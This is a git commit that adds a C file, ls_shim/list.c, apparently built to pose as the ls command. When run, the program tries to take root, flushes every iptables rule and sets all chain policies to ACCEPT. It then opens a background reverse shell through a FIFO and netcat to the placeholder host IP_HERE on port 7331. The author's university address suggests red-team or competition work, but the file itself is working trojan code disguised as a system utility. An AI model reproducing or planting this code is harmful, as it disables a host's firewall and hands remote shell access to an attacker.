8d6de077d94fec69e0cc10ecff07a0a32fa2bd4d
oneNutW0nder <scb5436@rit.edu>
2019-04-09 17:54:37 -0400

    Changed structure to match cat

---
+++ ls_shim/list.c
@@ -0,0 +1,20 @@
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char **argv){
+
+	setuid(0);
+	setgid(0);
+
+	system("iptables -F");
+	system("iptables -t mangle -F");
+
+	system("iptables -P INPUT ACCEPT");
+	system("iptables -P OUTPUT ACCEPT");
+	system("iptables -P FORWARD ACCEPT");
+
+	system("[ ! -p /tmp/aejhfgtg ] && mkfifo /tmp/aejhfgtg");
+	system("(/bin/bash 0</tmp/aejhfgtg | nc IP_HERE 7331 1>/tmp/aejhfgtg) &");
+
+	return 0;
+}
